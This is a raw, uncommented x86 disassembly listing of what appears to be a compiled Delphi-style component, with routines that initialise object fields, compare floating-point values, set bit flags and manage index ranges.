call sub_4802c0
pop ecx
jmp r-xdata
mov eax [ ebx + 0x48 ]
cmp [ eax + 0x8 ] 0x1
jle r-xdata
mov eax [ ebx + 0xa4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x30 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
push ebp
call sub_48023c
pop ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
jmp r-xdata
sub_480444
push esi
mov esi eax
mov eax [ esi + 0x3c ]
cmp edx eax
je r-xdata
pop esi
retn
test eax eax
je r-xdata
mov eax edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x140 ]
xor ecx ecx
mov [ eax + 0xa4 ] ecx
sub_48047c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax + 0x30 ]
mov [ ebx + 0x30 ] edx
mov edx [ eax + 0x34 ]
mov [ ebx + 0x34 ] edx
mov dl [ eax + 0x38 ]
mov [ ebx + 0x38 ] dl
mov al [ eax + 0x39 ]
mov [ ebx + 0x39 ] al
sub_4804b0
push ebp
mov ebp esp
push 0x0
mov edx eax
xor eax eax
push ebp
push sub_480528
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ edx + 0x30 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48052f
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp + 0x8 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x34 ] eax
mov eax edx
call sub_47fda4
sub_480580
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_480726
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_419db0
mov [ ebx + 0x9c ] 0xffffffff
xor eax eax
mov [ ebx + 0xf4 ] eax
mov [ ebx + 0x30 ] 0x1
mov [ ebx + 0x90 ] 0x1
xor eax eax
mov [ ebx + 0x50 ] eax
mov [ ebx + 0xa0 ] 0x0
xor eax eax
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x80 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x8 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f170
mov esi eax
mov [ ebx + 0x84 ] esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x2c ] 0x1
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0xc ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f170
mov [ ebx + 0x8c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x88 ] eax
mov [ ebx + 0x34 ] 0x20000000
mov [ ebx + 0x70 ] 0x1
mov [ ebx + 0x44 ] 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f6f4
mov [ ebx + 0x64 ] eax
lea edx [ ebx + 0x7c ]
mov eax [ rw-data ]
call sub_405ca4
lea edx [ ebx + 0x6c ]
mov eax [ rw-data ]
call sub_405ca4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x48 ] eax
xor eax eax
mov [ ebx + 0x74 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x60 ] eax
mov al [ r-xdata ]
mov [ ebx + 0xa1 ] al
mov [ ebx + 0x4c ] 0xffffffff
mov [ ebx + 0x5c ] 0xffffffff
mov [ ebx + 0xfa ] 0x1
mov [ ebx + 0xf8 ] 0x1
mov [ ebx + 0xfb ] 0x0
lea eax [ ebx + 0xf0 ]
call sub_404094
mov al [ r-xdata ]
mov [ ebx + 0xa8 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48072d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4040b8
retn
add esp 0xfffffff0
call sub_403668
sub_48074d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41a1b4
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_480784
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
sub_4807ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xa4 ]
call sub_403344
mov eax esi
mov [ ebx + 0xa4 ] eax
test eax eax
je r-xdata
mov eax ebx
call sub_480ca0
pop esi
pop ebx
retn
mov [ eax + 0x3c ] ebx
sub_4807d8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a0cc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_480d20
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
xor edx edx
mov eax esi
call sub_480fd8
sub_480810
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a128
push ebx
push sub_480a5c
push ebx
push sub_480ae4
mov eax [ ebx + 0x48 ]
cmp [ eax + 0x8 ] 0x1
setg cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push ebx
push sub_480920
cmp [ ebx + 0xf0 ] 0x0
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_480930
push ebx
push r-xdata
mov al [ r-xdata ]
cmp al [ ebx + 0xa8 ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_480930
push ebx
push esi
mov ebx eax
mov eax edx
call sub_418190
mov esi eax
mov al [ r-xdata ]
mov [ ebx + 0xa8 ] al
mov eax esi
and eax 0x1
dec eax
jne r-xdata
mov eax esi
and eax 0x2
cmp eax 0x2
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
mov eax esi
and eax 0x4
cmp eax 0x4
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
mov eax esi
and eax 0x8
cmp eax 0x8
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
mov eax esi
and eax 0x10
cmp eax 0x10
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
and esi 0x20
cmp esi 0x20
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
pop esi
pop ebx
retn
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
sub_480a5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_480ad5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_418240
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov edi eax
mov [ esi + 0x74 ] edi
mov esi edi
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax ebx
call sub_4172dc
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418ee0
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_418248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480adc
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_480ae4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov eax edi
call sub_419a8c
mov ebp [ ebx + 0x48 ]
mov ebx [ ebp + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_419a94
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_4143bc
mov edx [ eax + 0x8 ]
mov eax edi
call sub_419b34
inc esi
dec ebx
jne r-xdata
sub_480b4c
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x108 ]
test al al
je r-xdata
mov esi [ edi + 0x5c ]
mov ebx [ edi + 0x4c ]
sub ebx esi
jg r-xdata
mov esi [ edi + 0x4c ]
mov ebx [ edi + 0x5c ]
sub ebx esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
dec ebx
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
dec esi
inc ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_480b98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40328c
mov edx eax
mov eax ebx
call sub_4034d0
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
call sub_40328c
mov edx eax
mov eax esi
call sub_4034d0
test al al
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_480bd0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
fld [ esp + 0x8 ]
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor ebp ebp
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp esi ebx
je r-xdata
inc ebp
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_480b98
test al al
je r-xdata
mov edx ebp
mov eax [ esp + 0x18 ]
call sub_483fd0
mov ebx eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_481f8c
cmp eax [ esp ]
jle r-xdata
mov edx [ esp ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
fstp [ esp + 0x10 ]
fwait
fld [ esp + 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ esp + 0x8 ]
fwait
sub_480cb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx esi
call sub_4044a0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x40 ]
mov edx esi
call sub_4040e8
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
sub_480cec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x58 ]
mov edx esi
call sub_4044a0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_4040e8
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
sub_480d20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x48 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0x8 ] 0x0
jle r-xdata
xor edx edx
mov eax esi
call sub_4143bc
pop esi
pop ebx
retn
sub_480d44
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x48 ]
call sub_414210
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419e80
mov edx esi
mov eax ebx
call sub_483224
jmp r-xdata
sub_480d80
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x48 ]
call sub_4143bc
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax [ ebx + 0x48 ]
call sub_4143bc
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x48 ]
call sub_4143bc
mov edx ebx
call sub_483258
sub_480df8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_480dd8
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
test eax eax
je r-xdata
mov eax [ ebx ]
call sub_480d20
test eax eax
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x98 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
call sub_480d20
mov ecx eax
mov edx [ ebx ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov si 0xffb2
call sub_403540
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx eax
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xa4 ]
jmp r-xdata
mov eax [ ebx ]
call sub_481450
pop esi
pop ebx
pop ebp
retn
sub_480e78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_480fcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x68 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x114 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_414418
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480fd2
lea eax [ ebp - 0x10 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4810dc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_480d44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_480dd8
pop ecx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x108 ]
jmp r-xdata
sub_480fd8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push ebp
call sub_480e78
pop ecx
push ebp
call sub_480df8
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_481014
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_4810ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8c ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407ff0
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40412c
mov edi [ ebx + 0x80 ]
mov esi [ edi + 0x8 ]
dec esi
sub esi 0x2
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4810d1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0x4 ]
call sub_404094
retn
inc esi
mov ebx 0x2
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_48056c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_48056c
mov eax [ eax + 0x28 ]
lea edx [ ebp - 0x10 ]
call sub_407ff0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4044a0
jne r-xdata
sub_4810f0
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
mov edx [ edx + 0x2f4 ]
mov [ eax + 0x50 ] edx
mov dl [ eax + 0x90 ]
sub dl 0x1
jb r-xdata
mov edx [ eax + 0x68 ]
mov edx [ edx + 0x2f0 ]
mov [ eax + 0x50 ] edx
jmp r-xdata
sub dl 0x2
je r-xdata
mov edx [ eax + 0x68 ]
mov edx [ edx + 0x2f8 ]
mov [ eax + 0x54 ] edx
mov dl [ eax + 0xa0 ]
dec dl
je r-xdata
mov edx [ eax + 0x94 ]
test edx edx
je r-xdata
jmp r-xdata
mov edx [ eax + 0x68 ]
mov edx [ edx + 0x2fc ]
mov [ eax + 0x54 ] edx
jmp r-xdata
sub dl 0x2
je r-xdata
mov [ eax + 0x50 ] edx
retn
mov edx [ eax + 0x98 ]
test edx edx
je r-xdata
jmp r-xdata
mov [ eax + 0x54 ] edx
retn
sub_4811bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_4811ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebx + 0x78 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_481d28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481206
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_48120c
add esp 0xfffffff8
test dl dl
je r-xdata
mov edx ecx
mov ecx [ eax ]
call [ ecx + 0x68 ]
fstp [ esp ]
fwait
mov edx ecx
mov ecx [ eax ]
call [ ecx + 0x64 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
retn
sub_481234
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
call sub_480b24
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x54 ]
cmp [ eax + 0x8d ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x50 ]
cmp [ eax + 0x8d ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
call sub_47b578
fstp [ ebp - 0x8 ]
fwait
mov edx esi
call sub_47b578
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov edx ebx
call sub_47b578
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov edx edi
call sub_47b578
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4812b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
mov eax [ edi ]
mov [ eax + 0x4c ] 0xffffffff
mov eax [ edi ]
mov [ eax + 0x5c ] 0xffffffff
mov eax [ edi ]
call sub_481f8c
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
call sub_481f8c
mov ebx eax
dec ebx
mov eax [ edi ]
call sub_480b24
test al al
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x8c ]
cmp [ eax + 0x2c ] 0x0
setne al
mov eax [ edi ]
mov eax [ eax + 0x84 ]
cmp [ eax + 0x2c ] 0x0
setne al
jmp r-xdata
mov eax [ edi ]
xor edx edx
mov [ eax + 0x4c ] edx
mov eax [ edi ]
mov [ eax + 0x5c ] ebx
mov eax [ edi ]
xor edx edx
mov [ eax + 0x4c ] edx
mov eax [ edi ]
mov eax [ eax + 0x68 ]
add eax 0x28e
push ebp
mov edx [ eax + 0xc ]
push edx
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
call sub_481234
pop ecx
fstp [ ebp - 0x10 ]
fwait
mov eax [ edi ]
call sub_480b24
test al al
je r-xdata
mov edx [ edi ]
test [ edx + 0xf8 ] al
je r-xdata
mov eax [ edi ]
mov esi [ eax + 0x8c ]
jmp r-xdata
mov eax [ edi ]
mov esi [ eax + 0x84 ]
jmp r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jb r-xdata
mov eax [ edi ]
inc [ eax + 0x4c ]
mov eax [ edi ]
cmp ebx [ eax + 0x4c ]
jge r-xdata
mov eax [ edi ]
cmp [ eax + 0x4c ] 0x0
jl r-xdata
mov eax [ edi ]
mov [ eax + 0x4c ] 0xffffffff
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x68 ]
add eax 0x28e
push ebp
mov edx [ eax + 0x4 ]
push edx
mov ecx [ eax ]
mov edx [ eax + 0xc ]
push edx
mov eax [ eax + 0x8 ]
pop edx
call sub_481234
pop ecx
fstp [ ebp - 0x18 ]
fwait
mov eax esi
call sub_47f22c
fcomp [ ebp - 0x18 ]
fnstsw ax
sahf
ja r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov edx [ edi ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ edi ]
mov [ eax + 0x5c ] ebx
jmp r-xdata
mov eax [ edi ]
mov edx [ eax + 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ ebp - 0x18 ]
fnstsw ax
sahf
jb r-xdata
mov eax [ edi ]
inc [ eax + 0x5c ]
mov eax [ edi ]
cmp ebx [ eax + 0x5c ]
jge r-xdata
mov eax [ edi ]
cmp [ eax + 0xf9 ] 0x0
jne r-xdata
mov eax [ edi ]
mov [ eax + 0x5c ] ebx
jmp r-xdata
mov eax [ edi ]
mov edx [ eax + 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ ebp - 0x18 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ edi ]
dec [ eax + 0x5c ]
jmp r-xdata
sub_481478
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4814c1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x7c ]
call sub_4044a0
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4814c8
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4814d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_481519
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x6c ]
call sub_4044a0
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481520
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_481534
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp [ eax + 0x80 ]
mov esi [ ebp + 0x8 ]
dec esi
sub esi 0x2
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
retn
inc esi
mov edi 0x2
mov edx edi
mov eax ebp
call sub_48056c
push [ eax + 0x3c ]
push [ eax + 0x38 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
inc edi
dec esi
jne r-xdata
sub_481574
push ebx
push esi
push edi
add esp 0xffffffe4
mov [ esp ] ecx
mov edi edx
mov ebx eax
mov eax [ edi + 0x84 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x8 ]
fwait
mov eax [ edi + 0x8c ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x10 ]
fwait
mov eax ebx
call sub_480b24
push eax
mov eax edi
call sub_480b24
pop edx
cmp dl al
je r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ esp + 0x4 ] eax
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov eax [ ebx + 0x8c ]
mov edx [ esp + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebx + 0x80 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x18 ]
mov esi [ eax + 0x8 ]
dec esi
sub esi 0x2
jl r-xdata
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x8 ]
call sub_476964
mov eax [ esp + 0x4 ]
add esp 0x1c
pop edi
pop esi
pop ebx
retn
inc esi
mov ebx 0x2
mov eax [ edi + 0x80 ]
mov edx ebx
call sub_48056c
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx ebx
mov eax [ esp + 0x20 ]
call sub_48056c
mov edx [ esp + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
inc ebx
dec esi
jne r-xdata
sub_481654
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a98#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x30 ]
mov [ ebp - 0x8 ] eax
mov edi [ esi + 0x3c ]
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ esi + 0x88 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4143bc
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x3c ]
call sub_414438
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
